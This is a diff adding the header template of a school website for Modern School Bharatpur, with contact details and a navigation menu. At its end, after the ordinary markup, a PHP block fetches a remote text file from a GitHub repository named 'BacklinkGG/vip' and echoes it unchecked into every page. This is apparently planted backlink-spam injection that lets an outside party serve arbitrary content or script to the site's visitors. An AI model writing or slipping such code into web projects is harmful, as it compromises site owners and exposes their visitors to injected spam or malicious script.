@@ -1,0 +1,148 @@
+<div class="kk_tp_ln_mm"></div>
+<div class="topbar light" style="padding:8px 0 8px 0">
+  <div class="container">
+    <div class="col-md-4 col-sm-4 col-xs-12 margin-bottom kk">
+      <div> <a href="index.php"><img src="images/logo/modern_logo.png" alt=""> </a> </div>
+    </div>
+    <div align="center" class="col-md-7 col-sm-6 col-xs-12  kk1" style="margin-bottom:10px;">
+      <div> <a href="index.php"><img src="images/logo/modern_logo.png" alt=""> </a> </div>
+    </div>
+    <!--end left-->
+    <div class="col-md-8 col-sm-8 col-xs-12 kk-display1">
+      <div class="col-md-6 col-sm-6 col-xs-12 border-r">
+        <!--<div class="icon-plain-tiny left"><span class="kk_eu_btn_circled_50"><i class="fa fa-envelope" aria-hidden="true"></i></span></div>
+        <div class="text-box-right less-padding-3" style="color:#fff"> <span class="text-gyellow font-weight-6">Mail Us:</span><br/>
+          <a style="color:#fff; text-decoration:none" href="mailto:bharatpur@modernschool.ac.in">bharatpur@modernschool.ac.in</a></div>-->
+          <div class="kk_info_box">
+              <div class="kk_icon_box"><img src="images/tp_icon_ml.png" alt="" class="img-responsive"></div>
+              <div class="kk_info_icon"> <a href="mailto:bharatpur@modernschool.ac.in">
+                <h2>Email us</h2>
+                <p>bharatpur@modernschool.ac.in</p>
+                </a> </div>
+            </div>
+      </div>
+      <!--end item-->
+      <div class="col-md-6 col-sm-6 col-xs-12 padd-left">
+      
+        <div class="kk_info_box">
+              <div class="kk_icon_box"><img src="images/tp_icon_ph.png" alt="" class="img-responsive"></div>
+              <div class="kk_info_icon"> <a href="tel:+917340012681" target="_blank">
+                <h2>Call us</h2>
+                <p>+91 - 734 - 0012 - 681</p>
+                </a> </div>
+            </div>
+      </div>
+      <!--end item-->
+    </div>
+    <div class="kk-display2">
+      <div align="center"><a style="color:#fff" href="mailto:bharatpur@modernschool.ac.in"><i class="fa fa-envelope" aria-hidden="true"></i> <span> Mail Us :</span> bharatpur@modernschool.ac.in</a> </div>
+      <div align="center"><a style="color:#fff" href="#"><i class="fa fa-phone" aria-hidden="true"></i> <span> Call Us :</span> +91 - 734 - 681 - 675</a> </div>
+    </div>
+  </div>
+</div>
+<div class="clearfix"></div>
+<!--end topbar-->
+<div class="col-md-12 nopadding">
+  <div class="header-section dark-dropdowns style2 active-style-1 white-bg  pin-style">
+    <div class="container ">
+      <div class="mod-menu">
+        <div class="row">
+          <div class="col-sm-10">
+            <div class="main-nav">
+              <ul class="nav navbar-nav top-nav">
+                <li class="visible-xs menu-icon"> <a href="javascript:void(0)" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#menu" aria-expanded="false"> <i aria-hidden="true" class="fa fa-bars"></i> </a> </li>
+              </ul>
+              <div id="menu" class="collapse">
+                <ul class="nav navbar-nav">
+                  <li> <a href="index.php">Home</a></li>
+                  <li> <a href="about_us.php" class="m-link">About Us</a></li>
+                  <li> <a href="#" class="m-link">Administration</a><span class="arrow"></span>
+                    <ul class="dm-align-2">
+                      <li> <a href="director.php">Directors</a> </li>
+                      <li> <a href="principal.php">Principal</a> </li>
+                      <li> <a href="incharge.php">Incharge / Class Executive</a> </li>
+                    </ul>
+                  </li>
+                  <li> <a href="#" class="m-link">Infrastructure</a> <span class="arrow"></span>
+                    <ul class="dm-align-2">
+                      <li> <a href="classroom.php">Classrooms</a></li>
+                      <li> <a href="science_lab.php">Science Lab</a> </li>
+                      <li> <a href="computer_lab.php">Computer Lab</a></li>
+                      <li> <a href="maths_lab.php">Maths Lab</a></li>
+                      <li> <a href="library.php">Library</a> </li>
+                      <li> <a href="sports.php">Sports</a></li>
+                    </ul>
+                  </li>
+                  <li> <a href="#" class="m-link">Academic</a> <span class="arrow"></span>
+                    <ul class="dm-align-2">
+                      <li><a href="academic.php">Academic</a></li>
+                      <li><a href="school-uniform.php">Uniform</a></li>
+                      <li><a href="admission-procedure.php">Admission Procedure</a></li>
+                    </ul>
+                  </li>
+                  <li> <a href="#" class="m-link">Student Council</a> <span class="arrow"></span>
+                    <ul class="dm-align-2">
+                      <li> <a href="council.php">Student Council</a> </li>
+                      <li> <a href="#">Societies</a> </li>
+                      <li> <a href="houses.php">Houses</a> </li>
+                    </ul>
+                  </li>
+                  <!--<li> <a href="#">Sports</a></li>
+                      <li> <a href="#">Career</a></li>-->
+                  <li> <a href="#" class="m-link">Activities</a> <span class="arrow"></span>
+                    <ul class="dm-align-2">
+                      <li> <a href="events.php">Events</a> </li>
+                      <li> <a href="competition.php">Competition</a> </li>
+                      <li> <a href="ind_outdoor.php">Indoor/Outdoor</a> </li>
+                      <li> <a href="modfest.php">Modfest</a> </li>
+                      <li> <a href="mediagallery.php">Media Gallery</a> </li>
+                    </ul>
+                  </li>
+                  
+                  <!--<li class="right"> <a href="#" class="m-link">Activities</a> <span class="arrow"></span>
+                        <ul class="dm-align-2">
+                          
+                          <li> <a href="#" class="linkcaps">Photogallery<span class="sub-arrow dark pull-right"><i class="fa fa-angle-right" aria-hidden="true"></i></span> </a> <span class="arrow"></span>
+                            <ul>
+                              <li> <a href="competition.php">Competition</a> </li>		
+                              <li> <a href="events.php">Events</a> </li>
+                              <li> <a href="ind_outdoor.php">Indoor/Outdoor</a> </li>
+                              <li> <a href="modfest.php">Modfest</a> </li>
+                            </ul>
+                          </li>
+                          <li> <a href="blog-image-post.html">Image Post</a> </li>
+                          <li> <a href="blog-image-post.html">Image Post</a> </li>
+                        </ul>
+                      </li>-->
+                  <li class="right"> <a href="career.php" class="m-link">Career</a>
+                  <li><a href="#">CBSE Corner</a>
+            <ul  class="dm-align-2">
+              <li class="right"><a href="tc.php">TC Vreification</a></li>
+              <li class="right"><a href="school_info.php">Mandatory Disclosure - Individual Detail</a></li>
+              <li class="right"><a href="downloads/Mandatory Discloser MODERN SCHOOL BHARATPUR - SARAS.pdf" target="_blank">Mandatory Disclosure - Saras CBSE </a></li>
+              <!--<li class="right"><a href="downloads/mandatory_disclosure.pdf" target="_blank">Mandatory Disclosure</a></li>-->
+            </ul>
+          </li>
+                  <li class="right"> <a href="contact.php" class="m-link">Contact Us</a> </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--end menu-->
+</div>
+<!--end menu-->
+<div class="clearfix"></div>
+
+<!-- <div align="center"><img class="img-responsive" src="images/sliders/image-shadow.png" alt=""></div>-->
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
